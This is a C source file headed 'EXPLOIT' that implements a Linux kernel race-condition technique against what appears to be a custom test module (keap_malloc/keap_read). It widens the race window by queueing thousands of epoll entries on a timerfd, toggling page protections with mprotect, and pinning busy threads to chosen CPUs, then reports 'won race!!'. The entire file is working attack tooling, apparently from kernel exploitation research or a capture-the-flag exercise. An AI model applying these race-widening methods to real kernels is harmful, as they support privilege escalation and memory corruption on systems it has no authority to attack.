#include "libs/pwn.h"
#include <pthread.h>
#include <sys/mman.h>
#include <sys/random.h>
#include <unistd.h>
#include <sys/epoll.h>
#include <sys/timerfd.h>
#include <sys/socket.h>

/*******************************
 * EXPLOIT                     *
 *******************************/

int tfd;
int timefds[0x100];
int epfds[0x60];
char buf[0x1000];
size_t timeout = 20;

static void epoll_ctl_add(int epfd, int fd, uint32_t events) {
  struct epoll_event ev;
  ev.events = events;
  ev.data.fd = fd;
  SYSCHK(epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev));
}

void do_epoll_enqueue(int fd) {
  int cfd[2];
  socketpair(AF_UNIX, SOCK_STREAM, 0, cfd);
  for (int k = 0; k < 0x4; k++) {
    if (SYSCHK(fork()) == 0) {
      for (int i = 0; i < ARRAY_LEN(timefds); i++) {
        timefds[i] = SYSCHK(dup(fd));
      }
      for (int i = 0; i < ARRAY_LEN(epfds); i++) {
        epfds[i] = SYSCHK(epoll_create(0x1));
      }
      for (int i = 0; i < ARRAY_LEN(epfds); i++) {
        for (int j = 0; j < ARRAY_LEN(timefds); j++) {
          epoll_ctl_add(epfds[i], timefds[j], 0);
        }
      }
      write(cfd[1], buf, 1);
      raise(SIGSTOP); // stop here for nothing and just keep epoll alive
    }
    // sync to make sure it has queue what we need
    read(cfd[0], buf, 1);
  }
  close(cfd[0]);
  close(cfd[1]);
}

#define BUF_SIZE 0x100
#define SLOW_CPU 1
#define FAST_CPU 2

enum RACE { RACE_ONGOING = 0, RACE_WON, RACE_LOST };

int start_race = -1;
volatile int race_done = 0;

void *fast(void *buf) {
  void *ptr;

  pin_cpu(0, FAST_CPU);

  event_wait(start_race);
  linfo("starting fast thread");

  ptr = keap_malloc(BUF_SIZE, GFP_KERNEL_ACCOUNT);
  keap_read(ptr, buf, BUF_SIZE);

  keap_free(ptr);
  race_done = RACE_LOST;

  linfo("fast thread done");

  return NULL;
}

void *lag(void *lag) {
  pin_cpu(0, 0);
  int perms = PROT_READ | PROT_WRITE;
  while (is_busy) {
    perms ^= PROT_WRITE;
    mprotect((void *)lag, BUF_SIZE, perms);
  }
  return NULL;
}

void *slow(void *slow_buf) {
  void *ptr;

  pin_cpu(0, SLOW_CPU);

  linfo("starting slow thread");

  // slow down execute, increase race window
  ptr = keap_malloc(BUF_SIZE, GFP_KERNEL_ACCOUNT);
  event_signal(start_race);

  struct itimerspec new = {.it_value.tv_nsec = timeout};
  SYSCHK(timerfd_settime(tfd, TFD_TIMER_CANCEL_ON_SET, &new, NULL));
  // stall copy_from_user using mmaped file
  keap_read(ptr, slow_buf+0x1000-(BUF_SIZE/2), BUF_SIZE);

  keap_free(ptr);
  race_done = RACE_WON;

  linfo("slow thread done");

  return NULL;
}

int main(int argc, char *argv[]) {
  pthread_t slow_t, fast_t, busy_t[2], lag_t[0x2];

  lstage("INIT");

  setvbuf(stdout, NULL, _IONBF, 0);
  pin_cpu(0, 0);
  start_race = event_create();
  init();

  tfd = SYSCHK(timerfd_create(CLOCK_MONOTONIC, 0));
  do_epoll_enqueue(tfd);

  lstage("START");

  // create a busy thread to slow down execution
  for (int i = 0; i < ARRAY_LEN(busy_t); i++)
    pthread_create(&busy_t[i], NULL, busy_func, (void *)SLOW_CPU);
  for (int i = 0; i < ARRAY_LEN(lag_t); i++)
    pthread_create(&lag_t[i], NULL, lag, (void *)buf);
  pthread_create(&slow_t, NULL, slow, buf);
  pthread_create(&fast_t, NULL, fast, (void *)buf);

  is_busy = 0;
  pthread_join(slow_t, NULL);
  pthread_join(fast_t, NULL);
  for (int i = 0; i < ARRAY_LEN(busy_t); i++)
    pthread_join(busy_t[i], NULL);
  for (int i = 0; i < ARRAY_LEN(lag_t); i++)
    pthread_join(lag_t[i], NULL);

  close(start_race);

  if (race_done == RACE_LOST)
    lerror("failed racer");

  linfo("won race!!");
}
